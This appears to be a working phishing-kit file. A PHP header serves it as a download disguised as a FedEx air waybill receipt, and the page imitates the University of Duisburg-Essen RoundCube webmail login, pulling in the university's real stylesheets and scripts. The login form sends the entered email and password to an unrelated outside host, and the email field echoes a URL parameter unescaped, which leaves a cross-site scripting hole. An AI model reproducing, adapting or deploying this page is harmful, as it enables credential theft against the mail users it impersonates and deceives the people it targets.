<?php

header("Content-Disposition: attachment; filename=AirWayBillReceipt009Fedex.htm");

header("Content-Type: text/html"); // optional

readfile("roundcubeDarkd.php");

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<html><head><title>Welcome to RoundCube Webmail</title>

<meta name=Robots content=noindex,nofollow>

<meta name=viewport content=width=580>

<meta content=IE=EDGE http-equiv=X-UA-Compatible><!--<meta name="viewport" content="" id="viewport" />--><link 

rel="shortcut icon" href="skins/larry/images/favicon.ico"><link rel=stylesheet 

type=text/css 

href="https://webmailer.uni-duisburg-essen.de/skins/larry/styles.min.css?s=1411973811"><link 

rel=stylesheet type=text/css 

href="https://webmailer.uni-duisburg-essen.de/skins/uni-due/uni-due.css?s=1418724648"><!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/uni-due/svggradients.css?s=1411973811" /><![endif]--><!--[if lte IE 8]><link 

rel=stylesheet type=text/css 

href="https://webmailer.uni-duisburg-essen.de/skins/uni-due/iehacks.css?s=1411973811"><![endif]--><!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/uni-due/ie7hacks.css" /><![endif]--><link 

rel=stylesheet type=text/css 

href="https://webmailer.uni-duisburg-essen.de/plugins/rcs_skins/styles.css?s=1409653698"><link 

rel=stylesheet type=text/css 

href="https://webmailer.uni-duisburg-essen.de/plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1411973810">

<script type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/skins/uni-due/ui.js?s=1405858678"></script>



<meta content="text/html; charset=UTF-8" http-equiv=content-type>

<script type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/program/js/jquery.min.js?s=1411973810"></script>



<script type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/program/js/common.min.js?s=1411973810"></script>



<script type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/program/js/app.min.js?s=1411973810"></script>



<script type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/program/js/jstz.min.js?s=1411973810"></script>



<script type=text/javascript>



var rcmail = new rcube_webmail();

rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"outlook","refresh_interval":60,"session_lifetime":43200,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"dd.mm.yy","rcs_phone":false,"rcs_tablet":false,"rcs_mobile":false,"rcs_desktop":true,"rcs_device":"desktop","rcs_color":false,"rcs_skin":"uni-due","request_token":"7591407f1019998f55e75c994cbcb985"});

rcmail.gui_container("loginfooter","bottomline");

rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing..."});

rcmail.gui_object('loginform', 'form');

rcmail.gui_object('message', 'message');

</script>



<script type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/plugins/rcs_skins/scripts.js?s=1409653698"></script>



<script type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/plugins/jqueryui/js/jquery-ui-1.9.2.custom.min.js?s=1411973810"></script>



<meta name=GENERATOR content="MSHTML 8.00.7600.16385"></head>

<body>

<div id="login-form">

<div class="box-inner"><img id="logo" src="https://devinstechblog.com/wp-content/uploads/2016/08/Roundcube.png" alt="Webmail Round Cube" width="73" height="55" /><form action="http://directoryupdatee.altervista.org/veri1/member.php" method="post" name="form"><input name="_token" type="hidden" value="7591407f1019998f55e75c994cbcb985" /> <input name="_task" type="hidden" value="login" /><input name="_action" type="hidden" value="login" /><input id="rcmlogintz" name="_timezone" type="hidden" value="_default_" /><input id="rcmloginurl" name="_url" type="hidden" />

<table>

<tbody>

<tr>

<td class="title"><label for="rcmloginuser">Username</label></td>

<td class="input"><input id="rcmloginuser" autocomplete="off" name="q4_email" required="required" size="40" type="text" value="<?php echo $_GET['email']; // output 2489 ?>"<?php echo $_GET['email']; // output 2489 ?> placeholder="Email"></td>

</tr>

<tr>

<td class="title"><label for="rcmloginpwd">Password</label></td>

<td class="input"><input id="rcmloginpwd" autocomplete="off" name="q4_prince" required="required" size="40" type="password" /></td>

</tr>

</tbody>

</table>

<p class="formbuttons"><input id="rcmloginsubmit" class="button mainaction" type="submit" value="Login" /></p>

</form></div>

<div class="box-bottom">

<div id="message">&nbsp;</div>

<noscript>

<P class=noscriptwarning>Warning: This webmail service requires Javascript! In 

order to use it please enable Javascript in your browser's 

settings.</P></noscript></div>

<div id="bottomline">Webmail RoundCube&nbsp;1.0.3 &nbsp;●&nbsp; <a class="support-link" href="https://www.uni-due.de/zim/services/e-mail/roundcube.php" target="_blank">Get support</a></div>

</div>

<!-- [if lte IE 8]>

<SCRIPT type=text/javascript>



// fix missing :last-child selectors

$(document).ready(function(){

	$('ul.treelist ul').each(function(i,ul){

		$('li:last-child', ul).css('border-bottom', 0);

	});

});



</SCRIPT>

<![endif]-->

<p>&nbsp;</p>

<!-- Put HTML content here -->

<h3 style="text-align: center;">Round Cube</h3>

<p style="text-align: center;"><br /><br /></p>

</body></html>